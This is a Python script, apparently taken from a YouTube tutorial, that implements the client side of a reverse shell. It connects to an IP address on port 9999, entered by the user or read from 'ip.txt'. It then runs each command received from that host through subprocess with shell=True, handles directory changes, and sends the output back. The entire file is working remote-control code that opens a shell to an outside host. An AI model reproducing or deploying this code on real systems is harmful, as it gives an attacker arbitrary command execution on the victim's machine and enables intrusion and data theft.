# Source: https://www.youtube.com/watch?v=lT6s0T8lPyU&list=PLhTjy8cBISErYuLZUvVOYsR1giva2payF&index=12
import socket
import os
import subprocess

s = socket.socket()
# ipconfig -> Wireless LAN adapter Wi-Fi -> IPv4 Address
print('Enter IP address, or leave blank to reuse previous address: ', end='')
host = input()
if host == '':
    print('Attempting to read file...')
    with open("ip.txt") as f:
        host = f.read()
# If the user supplies a host, update the one on file
else:
    print('Updating file...')
    with open("ip.txt", "w") as f:
        f.write(host)
if host == '':
    print('File empty. Using default value. This probably won\'t work.')
    host = '10.49.176.22'
else:
    print('Loaded address ' + host + ' from file.')
port = 9999

s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    if (len(data) > 0):
        cmd = subprocess.Popen(data[:].decode("utf-8"),  # 'foo'[] -> syntax error, 'foo'[:] -> 'foo'
            shell = True, stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        currentWD = os.getcwd() + "> "
        s.send(str.encode(output_str + currentWD))
       #s.send(output_byte) #is surely also viable?
        print(output_str)